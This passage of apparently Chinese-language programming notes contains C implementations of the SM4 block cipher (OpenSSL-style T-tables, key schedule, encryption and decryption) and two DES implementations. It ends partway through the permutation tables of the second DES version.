0xDADA6EB4, 0x50504414, 0x0B0BCAC1,    0xA0A08828, 0xEFEF17F8, 0xB0B09C2C, 0x14141105, 0xACAC872B, 0x9D9DFB66,    0x6A6AF298, 0xD9D9AE77, 0xA8A8822A, 0xFAFA46BC, 0x10101404, 0x0F0FCFC0,    0xAAAA02A8, 0x11115445, 0x4C4C5F13, 0x9898BE26, 0x25256D48, 0x1A1A9E84,    0x18181E06, 0x6666FD9B, 0x7272EC9E, 0x09094A43, 0x41411051, 0xD3D324F7,    0x4646D593, 0xBFBF53EC, 0x6262F89A, 0xE9E9927B, 0xCCCCFF33, 0x51510455,    0x2C2C270B, 0x0D0D4F42, 0xB7B759EE, 0x3F3FF3CC, 0xB2B21CAE, 0x8989EA63,    0x939374E7, 0xCECE7FB1, 0x70706C1C, 0xA6A60DAB, 0x2727EDCA, 0x20202808,    0xA3A348EB, 0x5656C197, 0x02028082, 0x7F7FA3DC, 0x5252C496, 0xEBEB12F9,    0xD5D5A174, 0x3E3EB38D, 0xFCFCC33F, 0x9A9A3EA4, 0x1D1D5B46, 0x1C1C1B07,    0x9E9E3BA5, 0xF3F30CFF, 0xCFCF3FF0, 0xCDCDBF72, 0x5C5C4B17, 0xEAEA52B8,    0x0E0E8F81, 0x65653D58, 0xF0F0CC3C, 0x64647D19, 0x9B9B7EE5, 0x16169187,    0x3D3D734E, 0xA2A208AA, 0xA1A1C869, 0xADADC76A, 0x06068583, 0xCACA7AB0,    0xC5C5B570, 0x9191F465, 0x6B6BB2D9, 0x2E2EA789, 0xE3E318FB, 0xAFAF47E8,    0x3C3C330F, 0x2D2D674A, 0xC1C1B071, 0x59590E57, 0x7676E99F, 0xD4D4E135,    0x7878661E, 0x9090B424, 0x3838360E, 0x7979265F, 0x8D8DEF62, 0x61613859,    0x474795D2, 0x8A8A2AA0, 0x9494B125, 0x8888AA22, 0xF1F18C7D, 0xECECD73B,    0x04040501, 0x8484A521, 0xE1E19879, 0x1E1E9B85, 0x535384D7, 0x00000000,    0x19195E47, 0x5D5D0B56, 0x7E7EE39D, 0x4F4F9FD0, 0x9C9CBB27, 0x49491A53,    0x31317C4D, 0xD8D8EE36, 0x08080A02, 0x9F9F7BE4, 0x828220A2, 0x1313D4C7,    0x2323E8CB, 0x7A7AE69C, 0xABAB42E9, 0xFEFE43BD, 0x2A2AA288, 0x4B4B9AD1,    0x01014041, 0x1F1FDBC4, 0xE0E0D838, 0xD6D661B7, 0x8E8E2FA1, 0xDFDF2BF4,    0xCBCB3AF1, 0x3B3BF6CD, 0xE7E71DFA, 0x8585E560, 0x54544115, 0x868625A3,    0x838360E3, 0xBABA16AC, 0x7575295C, 0x929234A6, 0x6E6EF799, 0xD0D0E434,    0x6868721A, 0x55550154, 0xB6B619AF, 0x4E4EDF91, 0xC8C8FA32, 0xC0C0F030,    0xD7D721F6, 0x3232BC8E, 0xC6C675B3, 0x8F8F6FE0, 0x7474691D, 0xDBDB2EF5,    0x8B8B6AE1, 0xB8B8962E, 0x0A0A8A80, 0x9999FE67, 0x2B2BE2C9, 0x8181E061,    0x0303C0C3, 0xA4A48D29, 0x8C8CAF23, 0xAEAE07A9, 0x3434390D, 0x4D4D1F52,    0x3939764F, 0xBDBDD36E, 0x575781D6, 0x6F6FB7D8, 0xDCDCEB37, 0x15155144,    0x7B7BA6DD, 0xF7F709FE, 0x3A3AB68C, 0xBCBC932F, 0x0C0C0F03, 0xFFFF03FC,    0xA9A9C26B, 0xC9C9BA73, 0xB5B5D96C, 0xB1B1DC6D, 0x6D6D375A, 0x45451550,    0x3636B98F, 0x6C6C771B, 0xBEBE13AD, 0x4A4ADA90, 0xEEEE57B9, 0x7777A9DE,    0xF2F24CBE, 0xFDFD837E, 0x44445511, 0x6767BDDA, 0x71712C5D, 0x05054540,    0x7C7C631F, 0x40405010, 0x6969325B, 0x6363B8DB, 0x2828220A, 0x0707C5C2,    0xC4C4F531, 0x2222A88A, 0x969631A7, 0x3737F9CE, 0xEDED977A, 0xF6F649BF,    0xB4B4992D, 0xD1D1A475, 0x434390D3, 0x48485A12, 0xE2E258BA, 0x979771E6,    0xD2D264B6, 0xC2C270B2, 0x2626AD8B, 0xA5A5CD68, 0x5E5ECB95, 0x2929624B,    0x30303C0C, 0x5A5ACE94, 0xDDDDAB76, 0xF9F9867F, 0x9595F164, 0xE6E65DBB,    0xC7C735F2, 0x24242D09, 0x1717D1C6, 0xB9B9D66F, 0x1B1BDEC5, 0x12129486,    0x60607818, 0xC3C330F3, 0xF5F5897C, 0xB3B35CEF, 0xE8E8D23A, 0x7373ACDF,    0x3535794C, 0x8080A020, 0xE5E59D78, 0xBBBB56ED, 0x7D7D235E, 0xF8F8C63E,    0x5F5F8BD4, 0x2F2FE7C8, 0xE4E4DD39, 0x21216849};static uint32_t SM4_SBOX_T3[256] = {    0xD55B5B8E, 0x924242D0, 0xEAA7A74D, 0xFDFBFB06, 0xCF3333FC, 0xE2878765,    0x3DF4F4C9, 0xB5DEDE6B, 0x1658584E, 0xB4DADA6E, 0x14505044, 0xC10B0BCA,    0x28A0A088, 0xF8EFEF17, 0x2CB0B09C, 0x05141411, 0x2BACAC87, 0x669D9DFB,    0x986A6AF2, 0x77D9D9AE, 0x2AA8A882, 0xBCFAFA46, 0x04101014, 0xC00F0FCF,    0xA8AAAA02, 0x45111154, 0x134C4C5F, 0x269898BE, 0x4825256D, 0x841A1A9E,    0x0618181E, 0x9B6666FD, 0x9E7272EC, 0x4309094A, 0x51414110, 0xF7D3D324,    0x934646D5, 0xECBFBF53, 0x9A6262F8, 0x7BE9E992, 0x33CCCCFF, 0x55515104,    0x0B2C2C27, 0x420D0D4F, 0xEEB7B759, 0xCC3F3FF3, 0xAEB2B21C, 0x638989EA,    0xE7939374, 0xB1CECE7F, 0x1C70706C, 0xABA6A60D, 0xCA2727ED, 0x08202028,    0xEBA3A348, 0x975656C1, 0x82020280, 0xDC7F7FA3, 0x965252C4, 0xF9EBEB12,    0x74D5D5A1, 0x8D3E3EB3, 0x3FFCFCC3, 0xA49A9A3E, 0x461D1D5B, 0x071C1C1B,    0xA59E9E3B, 0xFFF3F30C, 0xF0CFCF3F, 0x72CDCDBF, 0x175C5C4B, 0xB8EAEA52,    0x810E0E8F, 0x5865653D, 0x3CF0F0CC, 0x1964647D, 0xE59B9B7E, 0x87161691,    0x4E3D3D73, 0xAAA2A208, 0x69A1A1C8, 0x6AADADC7, 0x83060685, 0xB0CACA7A,    0x70C5C5B5, 0x659191F4, 0xD96B6BB2, 0x892E2EA7, 0xFBE3E318, 0xE8AFAF47,    0x0F3C3C33, 0x4A2D2D67, 0x71C1C1B0, 0x5759590E, 0x9F7676E9, 0x35D4D4E1,    0x1E787866, 0x249090B4, 0x0E383836, 0x5F797926, 0x628D8DEF, 0x59616138,    0xD2474795, 0xA08A8A2A, 0x259494B1, 0x228888AA, 0x7DF1F18C, 0x3BECECD7,    0x01040405, 0x218484A5, 0x79E1E198, 0x851E1E9B, 0xD7535384, 0x00000000,    0x4719195E, 0x565D5D0B, 0x9D7E7EE3, 0xD04F4F9F, 0x279C9CBB, 0x5349491A,    0x4D31317C, 0x36D8D8EE, 0x0208080A, 0xE49F9F7B, 0xA2828220, 0xC71313D4,    0xCB2323E8, 0x9C7A7AE6, 0xE9ABAB42, 0xBDFEFE43, 0x882A2AA2, 0xD14B4B9A,    0x41010140, 0xC41F1FDB, 0x38E0E0D8, 0xB7D6D661, 0xA18E8E2F, 0xF4DFDF2B,    0xF1CBCB3A, 0xCD3B3BF6, 0xFAE7E71D, 0x608585E5, 0x15545441, 0xA3868625,    0xE3838360, 0xACBABA16, 0x5C757529, 0xA6929234, 0x996E6EF7, 0x34D0D0E4,    0x1A686872, 0x54555501, 0xAFB6B619, 0x914E4EDF, 0x32C8C8FA, 0x30C0C0F0,    0xF6D7D721, 0x8E3232BC, 0xB3C6C675, 0xE08F8F6F, 0x1D747469, 0xF5DBDB2E,    0xE18B8B6A, 0x2EB8B896, 0x800A0A8A, 0x679999FE, 0xC92B2BE2, 0x618181E0,    0xC30303C0, 0x29A4A48D, 0x238C8CAF, 0xA9AEAE07, 0x0D343439, 0x524D4D1F,    0x4F393976, 0x6EBDBDD3, 0xD6575781, 0xD86F6FB7, 0x37DCDCEB, 0x44151551,    0xDD7B7BA6, 0xFEF7F709, 0x8C3A3AB6, 0x2FBCBC93, 0x030C0C0F, 0xFCFFFF03,    0x6BA9A9C2, 0x73C9C9BA, 0x6CB5B5D9, 0x6DB1B1DC, 0x5A6D6D37, 0x50454515,    0x8F3636B9, 0x1B6C6C77, 0xADBEBE13, 0x904A4ADA, 0xB9EEEE57, 0xDE7777A9,    0xBEF2F24C, 0x7EFDFD83, 0x11444455, 0xDA6767BD, 0x5D71712C, 0x40050545,    0x1F7C7C63, 0x10404050, 0x5B696932, 0xDB6363B8, 0x0A282822, 0xC20707C5,    0x31C4C4F5, 0x8A2222A8, 0xA7969631, 0xCE3737F9, 0x7AEDED97, 0xBFF6F649,    0x2DB4B499, 0x75D1D1A4, 0xD3434390, 0x1248485A, 0xBAE2E258, 0xE6979771,    0xB6D2D264, 0xB2C2C270, 0x8B2626AD, 0x68A5A5CD, 0x955E5ECB, 0x4B292962,    0x0C30303C, 0x945A5ACE, 0x76DDDDAB, 0x7FF9F986, 0x649595F1, 0xBBE6E65D,    0xF2C7C735, 0x0924242D, 0xC61717D1, 0x6FB9B9D6, 0xC51B1BDE, 0x86121294,    0x18606078, 0xF3C3C330, 0x7CF5F589, 0xEFB3B35C, 0x3AE8E8D2, 0xDF7373AC,    0x4C353579, 0x208080A0, 0x78E5E59D, 0xEDBBBB56, 0x5E7D7D23, 0x3EF8F8C6,    0xD45F5F8B, 0xC82F2FE7, 0x39E4E4DD, 0x49212168};static uint32_t rotl(uint32_t a, uint8_t n){    return (a &lt;&lt; n) | (a &gt;&gt; (32 - n));}static uint32_t load_u32_be(const uint8_t *b, uint32_t n){    return ((uint32_t)b[4 * n] &lt;&lt; 24) |           ((uint32_t)b[4 * n + 1] &lt;&lt; 16) |           ((uint32_t)b[4 * n + 2] &lt;&lt; 8) |           ((uint32_t)b[4 * n + 3]);}static void store_u32_be(uint32_t v, uint8_t *b){    b[0] = (uint8_t)(v &gt;&gt; 24);    b[1] = (uint8_t)(v &gt;&gt; 16);    b[2] = (uint8_t)(v &gt;&gt; 8);    b[3] = (uint8_t)(v);}static uint32_t SM4_T_non_lin_sub(uint32_t X){    uint32_t t = 0;    t |= ((uint32_t)SM4_S[(uint8_t)(X &gt;&gt; 24)]) &lt;&lt; 24;    t |= ((uint32_t)SM4_S[(uint8_t)(X &gt;&gt; 16)]) &lt;&lt; 16;    t |= ((uint32_t)SM4_S[(uint8_t)(X &gt;&gt; 8)]) &lt;&lt; 8;    t |= SM4_S[(uint8_t)X];    return t;}static uint32_t SM4_T_slow(uint32_t X){    uint32_t t = SM4_T_non_lin_sub(X);    /*     * L linear transform     */    return t ^ rotl(t, 2) ^ rotl(t, 10) ^ rotl(t, 18) ^ rotl(t, 24);}static uint32_t SM4_T(uint32_t X){    return SM4_SBOX_T0[(uint8_t)(X &gt;&gt; 24)] ^           SM4_SBOX_T1[(uint8_t)(X &gt;&gt; 16)] ^           SM4_SBOX_T2[(uint8_t)(X &gt;&gt; 8)] ^           SM4_SBOX_T3[(uint8_t)X];}static uint32_t SM4_key_sub(uint32_t X){    uint32_t t = SM4_T_non_lin_sub(X);    return t ^ rotl(t, 13) ^ rotl(t, 23);}int ossl_sm4_set_key(const uint8_t *key, SM4_KEY *ks){    /*     * Family Key     */    static const uint32_t FK[4] = {        0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc};    /*     * Constant Key     */    static const uint32_t CK[32] = {        0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,        0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,        0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,        0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,        0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,        0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,        0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,        0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279};    uint32_t K[4];    int i;    K[0] = load_u32_be(key, 0) ^ FK[0];    K[1] = load_u32_be(key, 1) ^ FK[1];    K[2] = load_u32_be(key, 2) ^ FK[2];    K[3] = load_u32_be(key, 3) ^ FK[3];    for (i = 0; i &lt; SM4_KEY_SCHEDULE; i = i + 4)    {        K[0] ^= SM4_key_sub(K[1] ^ K[2] ^ K[3] ^ CK[i]);        K[1] ^= SM4_key_sub(K[2] ^ K[3] ^ K[0] ^ CK[i + 1]);        K[2] ^= SM4_key_sub(K[3] ^ K[0] ^ K[1] ^ CK[i + 2]);        K[3] ^= SM4_key_sub(K[0] ^ K[1] ^ K[2] ^ CK[i + 3]);        ks-&gt;rk[i] = K[0];        ks-&gt;rk[i + 1] = K[1];        ks-&gt;rk[i + 2] = K[2];        ks-&gt;rk[i + 3] = K[3];    }    return 1;}#define SM4_RNDS(k0, k1, k2, k3, F)         \\    do                                      \\    {                                       \\        B0 ^= F(B1 ^ B2 ^ B3 ^ ks-&gt;rk[k0]); \\        B1 ^= F(B0 ^ B2 ^ B3 ^ ks-&gt;rk[k1]); \\        B2 ^= F(B0 ^ B1 ^ B3 ^ ks-&gt;rk[k2]); \\        B3 ^= F(B0 ^ B1 ^ B2 ^ ks-&gt;rk[k3]); \\    } while (0)void ossl_sm4_encrypt(const uint8_t *in, uint8_t *out, const SM4_KEY *ks){    uint32_t B0 = load_u32_be(in, 0);    uint32_t B1 = load_u32_be(in, 1);    uint32_t B2 = load_u32_be(in, 2);    uint32_t B3 = load_u32_be(in, 3);    /*     * Uses byte-wise sbox in the first and last rounds to provide some     * protection from cache based side channels.     */    SM4_RNDS(0, 1, 2, 3, SM4_T_slow);    SM4_RNDS(4, 5, 6, 7, SM4_T);    SM4_RNDS(8, 9, 10, 11, SM4_T);    SM4_RNDS(12, 13, 14, 15, SM4_T);    SM4_RNDS(16, 17, 18, 19, SM4_T);    SM4_RNDS(20, 21, 22, 23, SM4_T);    SM4_RNDS(24, 25, 26, 27, SM4_T);    SM4_RNDS(28, 29, 30, 31, SM4_T_slow);\t    // 这个函数会导致小端 -&gt; 大端，直接内存 dump 密文的没有关系，如果是直接在这里比较密文的话要注意是大端，如果是写进内存比较直接默认比较就行    // 0x666c6167 -&gt; 0x67616c66    store_u32_be(B3, out);    store_u32_be(B2, out + 4);    store_u32_be(B1, out + 8);    store_u32_be(B0, out + 12);}void ossl_sm4_decrypt(const uint8_t *in, uint8_t *out, const SM4_KEY *ks){    uint32_t B0 = load_u32_be(in, 0);    uint32_t B1 = load_u32_be(in, 1);    uint32_t B2 = load_u32_be(in, 2);    uint32_t B3 = load_u32_be(in, 3);    SM4_RNDS(31, 30, 29, 28, SM4_T_slow);    SM4_RNDS(27, 26, 25, 24, SM4_T);    SM4_RNDS(23, 22, 21, 20, SM4_T);    SM4_RNDS(19, 18, 17, 16, SM4_T);    SM4_RNDS(15, 14, 13, 12, SM4_T);    SM4_RNDS(11, 10, 9, 8, SM4_T);    SM4_RNDS(7, 6, 5, 4, SM4_T);    SM4_RNDS(3, 2, 1, 0, SM4_T_slow);\t    // 这个函数会导致小端 -&gt; 大端，直接内存 dump 密文的没有关系，如果是直接在这里比较密文的话要注意是大端，如果是写进内存比较直接默认比较就行    // 0x666c6167 -&gt; 0x67616c66    store_u32_be(B3, out);    store_u32_be(B2, out + 4);    store_u32_be(B1, out + 8);    store_u32_be(B0, out + 12);}void printHex(char *name, void *ptr, int len){    printf(\"%s\", name);    for (size_t i = 0; i &lt; len; i++)        printf(\"%02x\", ((uint8_t *)ptr)[i]);    printf(\"\\n\");}void hexdump(char *name, const void *data, size_t size) {    const unsigned char *byte_data = (const unsigned char *)data;    size_t i, j;    printf(\"%s\\n\", name);    for (i = 0; i &lt; size; i += 16) {        // 打印偏移地址        printf(\"%08zx  \", i);        // 打印十六进制数据        for (j = 0; j &lt; 16; ++j) {            if (i + j &lt; size) {                printf(\"%02x \", byte_data[i + j]);            } else {                printf(\"   \"); // 不足部分用空格填充            }            // 在每8字节后添加一个额外的空格            if (j == 7) {                printf(\" \");            }        }        printf(\" |\");        // 打印ASCII字符        for (j = 0; j &lt; 16; ++j) {            if (i + j &lt; size) {                unsigned char ch = byte_data[i + j];                printf(\"%c\", isprint(ch) ? ch : '.');            } else {                printf(\" \");            }        }        printf(\"|\\n\");    }}int main(){    SM4_KEY *ks = (SM4_KEY *) malloc(sizeof(SM4_KEY));    uint8_t key[16] = {0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0xfe, 0xdc, 0xba, 0x98, 0x76, 0x54, 0x32, 0x10};    uint8_t input[16] = {0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0xfe, 0xdc, 0xba, 0x98, 0x76, 0x54, 0x32, 0x10};    uint8_t output[16];    ossl_sm4_set_key(key, ks);    ossl_sm4_encrypt(input, output, ks);    printHex(\"Output: \", output, 16);    return 0;}\n\n\n\nDES标志位修改一下就行了，加解密同源，实际上就是把 sub_key 倒过来\n代码1#include&lt;stdio.h&gt;  #include&lt;string.h&gt; #include&lt;stdlib.h&gt; #include\"table.h\"//存储各种数据表的头文件 // 十六轮子密钥 static bool SubKey[16][48] = { 0 }; /*-----------------------------自定义函数-----------------------------*/ void SetKey(char My_key[8]); //生成16轮的子密钥  void ByteToBit(bool * Data_out, char * Data_in, int Num); //字节转换成位 void BitToByte(char My_message[8], bool * Message_in, int Num); //位转换成字节  void TableReplace(bool *Data_out, bool *Data_in, const char *Table, int Num);  //各种表的置换算法  void Bitcopy(bool * Data_out, bool * Data_in, int Num);  //二进制数组的拷贝  void Loop_bit(bool * Data_out, int movstep, int len);  //左移 void Run_Des(char My_message[8], char CIPhertext[64]);//des的轮加密算法 void Xor(bool * Message_out, bool * Message_in, int Num); //执行异或  void S_change(bool * Data_out, bool * Data_in);  // S盒变换  void Run_desDes(char My_message[8], char CIPhertext[64]);// DES轮解密算法 /*--------------------------*//*--------------------------主函数----------------------------------*/int main(){    \tint i = 0, j;    \tchar My_key[8] = { 0 };  //记录加密密钥    \tchar You_key[8] = { 0 }; //解密密钥    \tchar My_message[8] = { 0 }; //明文    \tchar CIPhertext[64] = { 0 };//密文    \tprintf(\"请输入你要加密的内容(8 Byte):\\n\");    \tscanf(\"%s\", My_message);    \tprintf(\"请输入你的加密密钥(8 Byte):\\n\");    \tscanf(\"%s\", My_key);    \ti = strlen(My_key);    \twhile (i != 8)//确保密钥长度为8byte    \t{      \t    printf(\"请输入加密密钥(8 Byte)\\n\");      \t    scanf(\"%s\", My_key);      \t    i = 0;       \t    i = strlen(My_key);   \t}    \tSetKey(My_key);  //生成16轮的加密子密钥  \tRun_Des(My_message, CIPhertext); //des的轮加密过程   \tprintf(\"经过加密的密文为(二进制):\\n\");    \tprintf(\"%s\", CIPhertext);    \tprintf(\"\\n\");    \tRun_desDes(My_message, CIPhertext);//解密;    \tprintf(\"解密结果为:\\n\");    \tprintf(\"%s\", My_message);    \tprintf(\"\\n\");\treturn 0; } /*--------------------具体函数定义----------------------*/ void Bitcopy(bool * Data_out, bool * Data_in, int Num) //二进制数组拷贝 {    \tint i = 0;    \tfor (i = 0; i &lt; Num; i++)       \tData_out[i] = Data_in[i]; } void ByteToBit(bool * Data_out, char * Data_in, int Num) //字节转位，num为二进制位数 {    \tint i, j;    \tfor (i = 0; i &lt; Num; i++)       \tData_out[i] = (Data_in[i / 8] &gt;&gt; (i % 8)) &amp; 0x01; }void BitToByte(char My_message[8], bool * Message_in, int Num) //位转换成字节，num为位数 {    \tint i = 0;    \tfor (i = 0; i &lt; (Num / 8); i++)    \t\tMy_message[i] = 0;\tfor (i = 0; i &lt; Num; i++)   \t\tMy_message[i / 8] |= Message_in[i] &lt;&lt; (i % 8);} void TableReplace(bool *Data_out, bool * Data_in, const char *Table, int Num) // 置换算法,Num表示置换表的长度 {    \tint i = 0;    \tstatic bool Temp[256] = { 0 };    \tfor (i = 0; i &lt; Num; i++)    \t{       \t Temp[i] = Data_in[Table[i] - 1];//将输入数据的指定位置作为输出数据的第i位    \t }    \t Bitcopy(Data_out, Temp, Num);}void Loop_bit(bool * Data_out, int movstep, int len)//左循环移位 {   \t static bool Temp[256] = { 0 };   \t Bitcopy(Temp, Data_out, movstep);//将前movstep位数据放入temp缓存   \t Bitcopy(Data_out, Data_out + movstep, len - movstep);//数据依次向左移位    \t Bitcopy(Data_out + len - movstep, Temp, movstep);//将temp中缓存的数据放入最后 } void Xor(bool * Message_out, bool * Message_in, int Num)//执行异或 {    \tint i;\tfor (i = 0; i &lt; Num; i++)    \t{       \t Message_out[i] = Message_out[i] ^ Message_in[i];   \t} } void SetKey(char My_key[8])//8字节的初始密钥 {    \tint i, j;    \tstatic bool Key_bit[64] = { 0 }; //Key的二进制缓存    \tstatic bool *Key_bit_L, *Key_bit_R;    \tKey_bit_L = &amp;Key_bit[0]; //key的左边28位    \tKey_bit_R = &amp;Key_bit[28]; //key的右边28位  \tByteToBit(Key_bit, My_key, 64);    \tTableReplace(Key_bit, Key_bit, PC1_Table, 56);//pc-1 置换    \tfor (i = 0; i &lt; 16; i++)//生成第i个子密钥Subkey[i]  \t{        \t\tLoop_bit(Key_bit_L, Move_Table[i], 28);//左边28位进行左循环移位        \t\tLoop_bit(Key_bit_R, Move_Table[i], 28);//右边28位进行左循环移位        \t\tTableReplace(SubKey[i], Key_bit, PC2_Table, 48);//pc-2置换    \t} } void S_change(bool * Data_out, bool * Data_in) //S盒变换 {    \tint i;    \tint r = 0, c = 0;//S盒的行和列    \tfor (i = 0; i &lt; 8; i++, Data_in = Data_in + 6, Data_out = Data_out + 4) // 每6bit输入进行一次代换    \t{        \t\tr = Data_in[0] * 2 + Data_in[5] * 1;//将m1m6转换为十进制数，作为行数        \t\tc = Data_in[1] * 8 + Data_in[2] * 4 + Data_in[3] * 2 + Data_in[4] * 1;//将m2m3m4m5转换为十进制数，作为列数        \t\t\tByteToBit(Data_out, &amp;S_Box[i][r][c], 4);//取S盒数据,将其二进制形式的每一位填到输出的指定位置    \t} } void F_change(bool Data_out[32], bool Data_in[48])   // f函数 {    \tint i;    \tstatic bool Message_E[48] = { 0 };  //存放E置换的结果    \tTableReplace(Message_E, Data_out, E_Table, 48);//E表置换    \tXor(Message_E, Data_in, 48);//与密钥K[i]异或    \tS_change(Data_out, Message_E);  // S盒变换    \tTableReplace(Data_out, Data_out, P_Table, 32);  //P置换 }void Run_Des(char My_message[8], char CIPhertext[64])//des轮加密算法 {    \tint i;    \tstatic bool Message_bit[64] = { 0 };    \tstatic bool *Message_bit_L = &amp;Message_bit[0], *Message_bit_R = &amp;Message_bit[32];//分成左右两部分，每部分32位    \tstatic bool Temp[32] = { 0 };    \tByteToBit(Message_bit, My_message, 64);    \t\t\tTableReplace(Message_bit, Message_bit, IP_Table, 64);//初始置换    \tfor (i = 0; i &lt; 16; i++)//每一轮的加密    \t{        \t\tBitcopy(Temp, Message_bit_R, 32);//缓存右32位        \t\tF_change(Message_bit_R, SubKey[i]);//轮函数F        \t\tXor(Message_bit_R, Message_bit_L, 32);//左32位与轮函数F输出进行异或        \t\tBitcopy(Message_bit_L, Temp, 32);//右32位R(i-1)作为下一轮的Li    \t}    \tTableReplace(Message_bit, Message_bit, IPR_Table, 64);//逆初始置换    \tfor (i = 0; i &lt; 64;i++)        \tCIPhertext[i] = Message_bit[i]+'0';//由于是将bool型数据赋给字符型数据，因此要+'0'    \tCIPhertext[i] = '\\0'; } void Run_desDes(char My_message[8], char CIPhertext[64])// DES轮解密算法 {    \tint i = 0;    \tstatic bool Message_bit[64] = { 0 };    \tstatic bool * Message_bit_L = &amp;Message_bit[0], *Message_bit_R = &amp;Message_bit[32];    \tstatic bool Temp[32] = { 0 };    \tfor (i = 0; i &lt; 64; i++)        \tMessage_bit[i] = CIPhertext[i]-'0';    \tTableReplace(Message_bit, Message_bit, IP_Table, 64);    \tfor (i = 15; i &gt;= 0; i--)//与加密过程的区别是子密钥使用顺序相反    \t{        \t\tBitcopy(Temp, Message_bit_L, 32);        \t\tF_change(Message_bit_L, SubKey[i]);        \t\tXor(Message_bit_L, Message_bit_R, 32);\t\t\tBitcopy(Message_bit_R, Temp, 32);    }    \t\t\t\t\tTableReplace(Message_bit, Message_bit, IPR_Table, 64);    \t\tBitToByte(My_message, Message_bit, 64); \t}}\n\n代码2/* * Data Encryption Standard * An approach to DES algorithm *  * By: Daniel Huertas Gonzalez * Email: huertas.dani@gmail.com * Version: 0.1 *  * Based on the document FIPS PUB 46-3 */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#define LB32_MASK   0x00000001#define LB64_MASK   0x0000000000000001#define L64_MASK    0x00000000ffffffff#define H64_MASK    0xffffffff00000000/* Initial Permutation Table */static char IP[] = {    58, 50, 42, 34, 26, 18, 10,  2,     60, 52, 44, 36, 28, 20, 12,  4,     62, 54, 46, 38, 30, 22, 14,  6,     64, 56, 48, 40, 32, 24, 16,  8,     57, 49, 41, 33, 25, 17,  9,  1,     59, 51, 43, 35, 27, 19, 11,  3,     61, 53, 45, 37, 29, 21, 13,  5,     63, 55, 47, 39, 31, 23, 15,  7};/* Inverse Initial Permutation Table */static char PI[] = {    40,  8, 48, 16, 56, 24, 64, 32,     39,  7, 47, 15, 55, 23, 63, 31,     38,  6, 46, 14, 54, 22, 62, 30,     37,  5, 45, 13, 53, 21, 61, 29,     36,  4, 44, 12, 52, 20, 60, 28,     35,  3, 43, 11, 51, 19, 59, 27,     34,  2, 42, 10, 50, 18, 58, 26,     33,  1, 41,  9, 49, 17, 57, 25};/*Expansion table */static char E[] = {    32,  1,  2,  3,  4,  5,       4,  5,  6,  7,  8,  9,       8,  9, 10, 11, 12, 13,     12, 13, 14, 15, 16, 17,     16, 17, 18, 19, 20, 21,     20, 21, 22, 23, 24, 25,     24, 25, 26, 27, 28, 29,     28, 29, 30, 31, 32,  1};/* Post S-Box permutation */static char P[] = {    16,  7, 20, 21,     29, 12, 28, 17,      1, 15, 23, 26,      5, 18, 31, 10,      2,  8, 24, 14,     32, 27,  3,  9,     19, 13, 30,  6,     22, 11,  4, 25};/* The S-Box tables */static char S[8][64] = {{    /* S1 */    14,  4, 13,  1,  2, 15, 11,  8,  3, 10,  6, 12,  5,  9,  0,  7,       0, 15,  7,  4, 14,  2, 13,  1, 10,  6, 12, 11,  9,  5,  3,  8,       4,  1, 14,  8, 13,  6,  2, 11, 15, 12,  9,  7,  3, 10,  5,  0,     15, 12,  8,  2,  4,  9,  1,  7,  5, 11,  3, 14, 10,  0,  6, 13},{    /* S2 */    15,  1,  8, 14,  6, 11,  3,  4,  9,  7,  2, 13, 12,  0,  5, 10,       3, 13,  4,  7, 15,  2,  8, 14, 12,  0,  1, 10,  6,  9, 11,  5,       0, 14,  7, 11, 10,  4, 13,  1,  5,  8, 12,  6,  9,  3,  2, 15,     13,  8, 10,  1,  3, 15,  4,  2, 11,  6,  7, 12,  0,  5, 14,  9},{    /* S3 */    10,  0,  9, 14,  6,  3, 15,  5,  1, 13, 12,  7, 11,  4,  2,  8,      13,  7,  0,  9,  3,  4,  6, 10,  2,  8,  5, 14, 12, 11, 15,  1,      13,  6,  4,  9,  8, 15,  3,  0, 11,  1,  2, 12,  5, 10, 14,  7,     1, 10, 13,  0,  6,  9,  8,  7,  4, 15, 14,  3, 11,  5,  2, 12},{    /* S4 */     7, 13, 14,  3,  0,  6,  9, 10,  1,  2,  8,  5, 11, 12,  4, 15,      13,  8, 11,  5,  6, 15,  0,  3,  4,  7,  2, 12,  1, 10, 14,  9,      10,  6,  9,  0, 12, 11,  7, 13, 15,  1,  3, 14,  5,  2,  8,  4,     3, 15,  0,  6, 10,  1, 13,  8,  9,  4,  5, 11, 12,  7,  2, 14},{    /* S5 */     2, 12,  4,  1,  7, 10, 11,  6,  8,  5,  3, 15, 13,  0, 14,  9,     14, 11,  2, 12,  4,  7, 13,  1,  5,  0, 15, 10,  3,  9,  8,  6,      4,  2,  1, 11, 10, 13,  7,  8, 15,  9, 12,  5,  6,  3,  0, 14,     11,  8, 12,  7,  1, 14,  2, 13,  6, 15,  0,  9, 10,  4,  5,  3},{    /* S6 */    12,  1, 10, 15,  9,  2,  6,  8,  0, 13,  3,  4, 14,  7,  5, 11,    10, 15,  4,  2,  7, 12,  9,  5,  6,  1, 13, 14,  0, 11,  3,  8,     9, 14, 15,  5,  2,  8, 12,  3,  7,  0,  4, 10,  1, 13, 11,  6,     4,  3,  2, 12,  9,  5, 15, 10, 11, 14,  1,  7,  6,  0,  8, 13},{    /* S7 */     4, 11,  2, 14, 15,  0,  8, 13,  3, 12,  9,  7,  5, 10,  6,  1,    13,  0, 11,  7,  4,  9,  1, 10, 14,  3,  5, 12,  2, 15,  8,  6,     1,  4, 11, 13, 12,  3,  7, 14, 10, 15,  6,  8,  0,  5,  9,  2,     6, 11, 13,  8,  1,  4, 10,  7,  9,  5,  0, 15, 14,  2,  3, 12},{    /* S8 */    13,  2,  8,  4,  6, 15, 11,  1, 10,  9,  3, 14,  5,  0, 12,  7,     1, 15, 13,  8, 10,  3,  7,  4, 12,  5,  6, 11,  0, 14,  9,  2,     7, 11,  4,  1,  9, 12, 14,  2,  0,  6, 10, 13, 15,  3,  5,  8,     2,  1, 14,  7,  4, 10,  8, 13, 15, 12,  9,  0,  3,  5,  6, 11}};/* Permuted Choice 1 Table */static char 